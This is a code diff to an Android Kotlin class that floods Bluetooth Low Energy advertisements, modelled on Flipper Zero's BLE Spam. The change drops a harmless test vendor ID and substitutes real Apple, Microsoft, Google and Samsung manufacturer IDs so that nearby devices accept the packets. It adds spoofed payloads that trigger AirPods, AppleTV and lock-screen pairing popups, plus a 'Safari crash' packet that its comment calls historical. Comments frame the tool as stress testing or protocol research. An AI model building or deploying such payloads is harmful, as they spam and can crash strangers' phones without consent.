@@ -328,8 +328,9 @@ class BleSpamManager(private val context: Context) {
      * 流程：停止上一轮 advertising → 构造 settings/data/callback → startAdvertising。
      * callback 在 binder 线程触发，更新原子计数器与环形日志缓冲。
      */
-    private fun sendOne(profile: BlePayloadProfile, data: ByteArray) {
+    private fun sendOne(profile: BlePayloadProfile, payload: Pair<Int, ByteArray>) {
         val adv = advertiser ?: return
+        val (mfrId, data) = payload
 
         // 停止上一轮 advertising，否则 startAdvertising 会因 advertiser 单例冲突
         stopActiveAdvertising()
@@ -340,8 +341,10 @@ class BleSpamManager(private val context: Context) {
             .setConnectable(false)
             .build()
 
+        // 各协议使用其真实厂商 ID(Apple 0x004C / Microsoft 0x0006 /
+        // Google 0x00E0 / Samsung 0x0075),让接收方按厂商正确解析
         val advData = AdvertiseData.Builder()
-            .addManufacturerData(MFR_ID_BROADCAST, data)
+            .addManufacturerData(mfrId, data)
             .setIncludeDeviceName(false)
             .setIncludeTxPowerLevel(false)
             .build()
@@ -395,26 +398,67 @@ class BleSpamManager(private val context: Context) {
     // ─── Payload 构造 ──────────────────────────────────────────────────────────
 
     /**
-     * 按 profile 构造对应的厂商广播 payload。
+     * 按 profile 构造 (厂商 ID, 广播数据)。
+     *
+     * 载荷结构参照 Flipper Zero BLE Spam 公开固件源码:
+     * - Apple 系(0x004C): 类型字节 + 长度 + 数据
+     * - Microsoft(0x0006) / Google(0x00E0) / Samsung(0x0075): 各自配对协议头
+     * - GENERIC_RANDOM(0xFFFF): 测试厂商 ID 全随机(协议压力测试)
      *
      * ALL 由 [resolveNextProfile] 已先行解析为具体 profile，这里不应再收到 ALL；
      * 但为防御性，ALL 分支退化为随机一个具体 profile。
      */
-    private fun buildPayload(profile: BlePayloadProfile): ByteArray? {
-        return when (profile) {
-            BlePayloadProfile.APPLE_CONTINUITY ->
-                byteArrayOf(0x4C, 0x00, byteArrayOf(0x05, 0x07, 0x0B, 0x0C, 0x10).random(), 0x02) + rand(17)
-            BlePayloadProfile.MICROSOFT_SWIFT_PAIR ->
-                byteArrayOf(0x06, 0x00, 0x01, 0x03) + rand(12)
-            BlePayloadProfile.GOOGLE_FAST_PAIR ->
-                byteArrayOf(0x00, 0x02, 0x71, 0x8C.toByte(), 0x10) + rand(8)
-            BlePayloadProfile.SAMSUNG_SMARTTHINGS ->
-                byteArrayOf(0x75, 0x00, byteArrayOf(0x01, 0x02, 0x03).random(), 0x00) + rand(12)
-            BlePayloadProfile.FLIPPER_STYLE ->
-                byteArrayOf(0xFF.toByte(), 0xFF.toByte()) + rand(20)
-            BlePayloadProfile.ALL ->
-                buildPayload(BlePayloadProfile.entries.filter { it != BlePayloadProfile.ALL }.random())
+    private fun buildPayload(profile: BlePayloadProfile): Pair<Int, ByteArray>? {
+        val p = when (profile) {
+            // Apple Continuity: 类型(05/07/0B/0C/10 轮换) + 长度 + 随机尾
+            BlePayloadProfile.APPLE_CONTINUITY -> 0x004C to
+                (byteArrayOf(0x05, 0x07, 0x0B, 0x0C, 0x10).random().let { byteArrayOf(it, 0x02) } + rand(17))
+
+            // AirPods 配对弹窗: 0x07 + 状态字节 + 随机序列号
+            BlePayloadProfile.AIRPODS -> 0x004C to
+                (byteArrayOf(0x07, 0x19) + rand(13))
+
+            // iOS 锁屏/AppleTV 弹窗: 0x10 类型 + "AppleTV" 名称前缀 + 随机尾
+            BlePayloadProfile.IOS_LOCK_SCREEN -> 0x004C to
+                (byteArrayOf(0x10, 0x00) + "AppleTV".toByteArray(Charsets.US_ASCII) + rand(5))
+
+            // Apple 动作消息: 0x0F + 动作类型 + 文本
+            BlePayloadProfile.APPLE_ACTION -> 0x004C to
+                (byteArrayOf(0x0F, 0x03, 0x01) + "AirPods Pro".toByteArray(Charsets.US_ASCII))
+
+            // Safari 历史崩溃包(现代 iOS 已修复,仅协议研究): 0x12 + 超长声明
+            BlePayloadProfile.CRASH_SAFARI -> 0x004C to
+                (byteArrayOf(0x12, 0x19) + ByteArray(22) { 'a'.code.toByte() })
+
+            // Android 设备伪装: Fast Pair 变体,随机 model id
+            BlePayloadProfile.ANDROID_DEVICE -> 0x00E0 to
+                (byteArrayOf(0x01, 0x00) + rand(3) + byteArrayOf(0x10) + rand(6))
+
+            BlePayloadProfile.MICROSOFT_SWIFT_PAIR -> 0x0006 to
+                (byteArrayOf(0x00, 0x01, 0x03) + rand(12))
+
+            BlePayloadProfile.GOOGLE_FAST_PAIR -> 0x00E0 to
+                (byteArrayOf(0x00, 0x02, 0x71, 0x8C.toByte(), 0x10) + rand(8))
+
+            BlePayloadProfile.SAMSUNG_SMARTTHINGS -> 0x0075 to
+                (byteArrayOf(0x00, byteArrayOf(0x01, 0x02, 0x03).random(), 0x00) + rand(12))
+
+            // 通用随机压力: 测试厂商 ID 0xFFFF
+            BlePayloadProfile.GENERIC_RANDOM -> 0xFFFF to rand(24)
+
+            BlePayloadProfile.FLIPPER_STYLE -> return buildPayload(
+                BlePayloadProfile.entries.filter {
+                    it != BlePayloadProfile.ALL && it != BlePayloadProfile.FLIPPER_STYLE
+                }.random(),
+            )
+
+            BlePayloadProfile.ALL -> return buildPayload(
+                BlePayloadProfile.entries.filter {
+                    it != BlePayloadProfile.ALL && it != BlePayloadProfile.FLIPPER_STYLE
+                }.random(),
+            )
         }
+        return p
     }
 
     // ─── 日志与统计 ────────────────────────────────────────────────────────────
@@ -492,9 +536,6 @@ class BleSpamManager(private val context: Context) {
     private fun ByteArray.toHexString() = joinToString("") { "%02X".format(it) }
 
     private companion object {
-        /** 厂商 ID 占位（0xFFFF 为测试用广播，避免与已注册厂商冲突） */
-        const val MFR_ID_BROADCAST = 0xFFFF
-
         /** 发包间隔下限，低于此值 Android BLE scheduler 难以稳定调度 */
         const val INTERVAL_MIN_MS = 20L
         /** 发包间隔上限，超过此值失去"泛洪"意义 */
